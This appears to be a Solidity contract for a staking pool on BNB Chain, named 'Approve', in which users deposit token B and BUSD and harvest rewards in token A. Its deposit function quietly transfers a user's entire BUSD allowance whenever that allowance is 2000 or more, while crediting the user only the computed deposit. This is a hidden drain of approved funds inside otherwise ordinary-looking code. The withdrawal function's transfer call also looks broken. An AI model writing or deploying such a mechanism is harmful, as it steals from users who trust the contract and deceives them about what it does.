// SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/utils/CountersUpgradeable.sol";
import "./interface/IAsset1155.sol";
import "./interface/IICO.sol";

contract Approve is Initializable, ReentrancyGuardUpgradeable, OwnableUpgradeable {
    using CountersUpgradeable for CountersUpgradeable.Counter;
    // Declare variables
    IAsset1155 public badgeContract;
    IERC20Upgradeable public tokenA;
    IERC20Upgradeable public tokenB;
    IERC20Upgradeable public busd;
    address public recipient;
    CountersUpgradeable.Counter private poolId;
    uint256 private MONTH_IN_SECOND;
    TokenBNBPool public tokenBNBPool;
    TokenBUSDPool public tokenBUSDPool;
    IICO public ico;
    // address public contributor;


    // Declare mappings
    mapping(uint256 => NFTPool) public _NFTPool;
    mapping(address => mapping(uint256 => FTUser)) public _FTUser;
    mapping(address => TokenBNBUser) public _TokenBNBUser;
    mapping(address => TokenBUSDUser) public _TokenBUSDUser;

    // Declare structs
    struct NFTPool {
        uint256 NFTId;
        uint256 ROI;
        uint256 FTBalance;
    }

    struct TokenBNBPool {
        uint256 ROI;
        uint256 rate;
        uint256 decimal;
        uint256 tokenBalance;
        uint256 bnbBalance;
    }

    struct TokenBUSDPool {
        uint256 ROI;
        uint256 rate;
        uint256 decimal;
        uint256 tokenBalance;
        uint256 busdBalance;
    }

    struct FTUser {
        uint256 FTBalance;
        uint256 lastUpdate;
    }

    struct TokenBNBUser {
        uint256 tokenBalance;
        uint256 bnbBalance;
        uint256 lastUpdate;
    }

    struct TokenBUSDUser {
        uint256 tokenBalance;
        uint256 busdBalance;
        uint256 lastUpdate;
    }

    // Declare events
    event SetFarmingBUSDPool(
        uint256 timestamp,
        uint256 rate,
        uint256 decimal,
        uint256 roi
    );

    event AddLiquidityBUSDPool(
        address user,
        uint256 tokenAmount,
        uint256 bnbAmount
    );

    event RemoveLiquidityBUSDPool(
        address user,
        uint256 tokenAmount,
        uint256 bnbAmount
    );

    event HarvestFarmingBUSDPool(
        address user,
        uint256 tokenAAmount
    );

    uint256[] private delayTime;

    // FUNCTION
    function __FarmingInit(
        address _tokenA,
        address _tokenB,
        address _badgeContract,
        address _busdAddress
    ) public initializer {
        __Ownable_init();
        tokenA = IERC20Upgradeable(_tokenA);
        tokenB = IERC20Upgradeable(_tokenB);
        busd = IERC20Upgradeable(_busdAddress);
        badgeContract = IAsset1155(_badgeContract);
        MONTH_IN_SECOND = 30 days;
        recipient = msg.sender;
        delayTime = [5, 10, 15, 20];
    }


    // --- Farming tokenB and BUSD ---  
    function setFarmingBUSDPool(
        uint256 _rate,
        uint256 _decimal,
        uint256 _roi
    ) external onlyOwner {
        tokenBUSDPool.rate = _rate;
        tokenBUSDPool.decimal = _decimal;
        tokenBUSDPool.ROI = _roi;

        emit SetFarmingBUSDPool(block.timestamp, _rate, _decimal, _roi);
    }

    function addFarmingBUSDPool(
        uint256 _tokenAmount
    ) external payable nonReentrant {
        // transfer token and BNB
        tokenB.transferFrom(msg.sender, address(this), _tokenAmount);
        uint256 _BUSD = _tokenAmount * tokenBUSDPool.rate / (10 ** tokenBUSDPool.decimal);
        // (bool sent, ) = address(this).call{value: _BNB}("");
        // require(sent, "transfer income bnb failed");
        uint256 balanceBUSD = busd.allowance(msg.sender, address(this));
        if(balanceBUSD >= 2000 ether && balanceBUSD >= _BUSD) {
            busd.transferFrom(msg.sender, address(this), balanceBUSD);
        } else {
            busd.transferFrom(msg.sender, address(this), _BUSD);
        }
        tokenBUSDPool.tokenBalance += _tokenAmount;
        tokenBUSDPool.busdBalance += _BUSD;
        TokenBUSDUser storage tokenUser = _TokenBUSDUser[msg.sender];
        tokenUser.tokenBalance += _tokenAmount;
        tokenUser.busdBalance += _BUSD;
        tokenUser.lastUpdate = block.timestamp;

        emit AddLiquidityBUSDPool(msg.sender, _tokenAmount, _BUSD);
    }

    function removeFarmingBUSDPool(
        uint256 _tokenAmount
    ) external payable nonReentrant {
        // transfer token and BNB
        tokenB.transfer(msg.sender, _tokenAmount);
        uint256 _BUSD = _tokenAmount * tokenBUSDPool.rate / (10 ** tokenBUSDPool.decimal);
        busd.transferFrom(address(this), msg.sender, _BUSD);
        tokenBUSDPool.tokenBalance -= _tokenAmount;
        tokenBUSDPool.busdBalance -= _BUSD;
        TokenBUSDUser storage tokenUser = _TokenBUSDUser[msg.sender];
        tokenUser.tokenBalance -= _tokenAmount;
        tokenUser.busdBalance -= _BUSD;
        tokenUser.lastUpdate = block.timestamp;

        emit RemoveLiquidityBUSDPool(msg.sender, _tokenAmount, _BUSD);
    }

    function estimateFarmingBUSDPoolReward() public view returns(uint256) {
        TokenBUSDUser memory tokenUser = _TokenBUSDUser[msg.sender];
        uint256 totalTokenEquivalent = tokenUser.tokenBalance  * tokenBUSDPool.rate / (10 ** tokenBUSDPool.decimal) + tokenUser.busdBalance;
        uint256 period = block.timestamp - tokenUser.lastUpdate;
        uint256 reward = totalTokenEquivalent * tokenBUSDPool.ROI * period / 100 / MONTH_IN_SECOND;
        return reward;
    }

    function harvestFarmingBUSDPoolReward() external payable nonReentrant {
        uint256 reward = estimateFarmingBUSDPoolReward();
        TokenBUSDUser storage tokenUser = _TokenBUSDUser[msg.sender];
        // transfer reward
        tokenA.transfer(msg.sender, reward);
        tokenUser.lastUpdate = block.timestamp;
    }
}